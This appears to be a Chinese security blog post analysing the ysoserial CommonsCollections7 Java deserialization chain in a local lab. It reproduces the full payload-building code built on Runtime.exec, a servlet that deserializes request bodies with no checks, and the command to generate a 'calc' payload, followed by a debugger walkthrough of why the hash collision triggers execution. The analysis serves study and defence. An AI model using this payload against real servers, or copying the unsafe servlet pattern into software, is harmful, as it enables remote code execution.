> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/uG_Nfak2mEjDiUwZnFL2tg)

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUG88cho05a0WTx4e1QjM6GLJMEIGdE0uG52aY7AtBNZp07Wgt1SIfphlgptsxU1MYXvUPNORgmQw/640?wx_fmt=png)

前言
--

学习 CommonsCollections7 反序列化链。

ysoserial 中 CC7 payload 构造
--------------------------

CC7 利用链中是使用 Hashtable 作为反序列化的入口点

```
public Hashtable getObject(final String command) throws Exception {

   // Reusing transformer chain and LazyMap gadgets from previous payloads
   final String[] execArgs = new String[]{command};

   final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

   final Transformer[] transformers = new Transformer[]{
       new ConstantTransformer(Runtime.class),
       new InvokerTransformer("getMethod",
           new Class[]{String.class, Class[].class},
           new Object[]{"getRuntime", new Class[0]}),
       new InvokerTransformer("invoke",
           new Class[]{Object.class, Object[].class},
           new Object[]{null, new Object[0]}),
       new InvokerTransformer("exec",
           new Class[]{String.class},
           execArgs),
       new ConstantTransformer(1)};

   Map innerMap1 = new HashMap();
   Map innerMap2 = new HashMap();

   // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
   Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
   lazyMap1.put("yy", 1);

   Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
   lazyMap2.put("zZ", 1);

   // Use the colliding Maps as keys in Hashtable
   Hashtable hashtable = new Hashtable();
   hashtable.put(lazyMap1, 1);
   hashtable.put(lazyMap2, 2);

   Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

   // Needed to ensure hash collision after previous manipulations
   lazyMap2.remove("yy");

   return hashtable;
}

```

前面依然是构造`ChainedTransformer`对象，不作分析。  

定义两个 HashMap 对象，并将他们绑定到`LazyMap`上，给他们添加键值对。put 进第一个`LazyMap`的 key 为字符串`yy`，put 进第二个`LazyMap`的 key 为字符串`zZ`。

随后定义一个`Hashtable`对象，将前面定义的两个`LazyMap`对象作为 key，put 进`Hashtable`对象。

最后再删除 lazyMap2 对象的 key 为`yy`的数据。初始定义的`lazyMap2`只 put 进一个键值对：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUG88cho05a0WTx4e1QjM6G8Ja8VFWpZMOCv9HHW2ekUibVkmYmOiaarfZFe7bia3xHjPgfHQZlqiaRMg/640?wx_fmt=png)

经过`Hashtable`第二次 put 后，值变为如下：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUG88cho05a0WTx4e1QjM6GfpLdE8TAjyuiaIw0uK70ibSdkDVC9RUx6rWozY7Fv5LvhMm3djJDUWJQ/640?wx_fmt=png)

随后将该`Hashtable`作为序列化对象返回。

这里抛出几个疑问后续解决：

1.  为什么需要 put 两个 LazyMap 对象；
    
2.  为什么需要移除第二个 lazymap 的 "yy" 元素；
    
3.  put 进两个 lazymap 的 "yy" 和 "zZ" 字符串能否换成其他的字符串。
    

反序列化过程分析
--------

### 1. 创建 web 项目

创建一个 maven web 项目，并创建一个 servlet 如下：

```
package com.example;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;

@WebServlet("/s1")
public class Servlet1 extends HttpServlet {
   @Override
   protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
       InputStream inputStream = req.getInputStream();
       ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
       try {
           objectInputStream.readObject();
      } catch (ClassNotFoundException e) {
           e.printStackTrace();
      }
  }

   @Override
   protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
       this.doGet(req, resp);
  }
}

```

pom.xml 中添加 commons-collections 3.1 依赖

```
<dependency>
<groupId>commons-collections</groupId>
<artifactId>commons-collections</artifactId>
<version>3.1</version>
</dependency>

```

使用 yso 生成 calc 命令的 payload：

```
java -jar CommonsCollections7 calc > cc7.ser

```

利用 burp 发送 payload，成功执行命令弹出计算器：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUG88cho05a0WTx4e1QjM6GwScicLTzf8tJ5H0QPKMdtqr3hCZxicMXTSVPo26mQztg7x33MvyL7Ncg/640?wx_fmt=png)  

### 2. 反序列化链分析

反序列化的对象是`Hashtable`，在`Hashtable.readObject`方法处打上断点。

这里会调用`reconstitutionPut`方法，从序列化数据中读取并赋值：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUG88cho05a0WTx4e1QjM6GAD6et7moibfrZ9QFzzbJQ6N3WEyqGKW8ryWM1sIdywjozzjcLVabMfw/640?wx_fmt=png)

继续跟进一下：

#### Hashtable.reconstitutionPut

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUG88cho05a0WTx4e1QjM6Gr6xmLb7kQg2WMib2brAD5TIXfkj88zrqRyZwN7icEIeGXWfF89UslFrQ/640?wx_fmt=png)

传入的`tab`变量为 Hashtable，现在其里面没有元素。

传入的`key`变量为`LazyMap`，就是我们构造序列化数据时的第一个`LazyMap`。

计算`LazyMap`的 hashcode 值，然后从`tab`中取数据比较 hash 和`equals`方法。这里 tab 为空，故不会进入该 for 循环。

随后将 lazymap 等值放入 tab 中：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUG88cho05a0WTx4e1QjM6GpejFQjHugPW2ric1bXHso8E9popJSRgtJIYVKNIFCbcrMYE9GaHjkuA/640?wx_fmt=png)

#### 第二次 Hashtable.reconstitutionPut

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUG88cho05a0WTx4e1QjM6G8xb2Zu8sib94e09JoCWOXnHnkSoFfT6blDicvlU9Chmr0JwJiaKvXBrNA/640?wx_fmt=png)

传入的`tab`不为空了，在上一次操作中，已经对其进行了赋值。

传入的`key`变量为`LazyMap`，就是我们构造序列化数据时的第二个`LazyMap`。

计算`LazyMap`的 hashcode 值，然后从 tab 中取上一个 lazymap 的 hashcode 值，将其进行比较。

两个 lazymap 分别是：`"yy"->1`；`"zZ"->1`

但是计算出来的 hashcode 值确实一样的，这里就满足 if 中第一个条件。

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUG88cho05a0WTx4e1QjM6GWhmicJbomO7QKrblNN3PnLoibNEj0icHxhNtUQyJ51N7Z0mYsz63t1WGw/640?wx_fmt=png)

e 为`Hashtable`对象，`e.key`为第一个 lazymap，key 为第二个 lazymap。

进入`equals`方法。

#### AbstractMapDecorator.equals()

`LazyMap`没有`equals`方法，所以进入其父类`AbstractMapDecorator.equals()`方法。

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUG88cho05a0WTx4e1QjM6GVW7xgiauXyZSVmZFlMhMMJdxUPha82vicbN3TXt0l0Nq30hKrGr5cN9A/640?wx_fmt=png)

object 为第二个 lazymap。

随后调用`this.map.equals()`方法，`this`是第一个 lazymap 对象，`this.map`就是绑定到上面的`HashMap`对象。这里进入`HashMap`的父类`AbstractMap.equals()`方法。

#### AbstractMap.equals()

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XUG88cho05a0WTx4e1QjM6GUsxn5MZthm6ibxv6zEBgoibXzz1S7XBrGdZgfibVZSrFEiaFIfiamKLfoaw/640?wx_fmt=png)

变量`o`为第二个 lazymap 对象。

将变量`o`赋值给变量`m`，在后面调用`m.get()`方法，即`LazyMap.get()`方法，lazymap 上绑定了`transformerChain`，这样就会触发连锁反应执行命令。

### 3. 问题

#### 为什么需要 put 两个 LazyMap 对象

`Hashtable.reconstitutionPut`方法是循环调用，如果只有一个元素，即第一次进入时，tab 为空，是不会进入 equals 方法。

#### 为什么需要移除第二个 lazymap 的 "yy" 元素

在`AbstractMap.equals()`方法中，调用`LazyMap.get(key)`方法，这是第二个 lazymap，此时`key`的值为`yy`。如果不移除第二个 lazymap 的这个元素，就不满足连锁反应 rce 的条件（lazymap 调用 get 方法时，key 不存在）。

#### put 进两个 lazymap 的 "yy" 和 "zZ" 字符串能否换成其他的字符串

在前面反序列化的分析过程中，需要满足两个 lazymap 的 hashcode 值一致，才能进入 equals 方法。

"yy" 和 "zZ" 就是满足条件的一对，此外还有字符串 "AaAaAa" 和 "BBAaBB" 的 hashcode 也满足条件。

参考链接
----

https://www.cnblogs.com/nice0e3/p/13910833.html

https://blog.csdn.net/weixin_43818995/article/details/122283565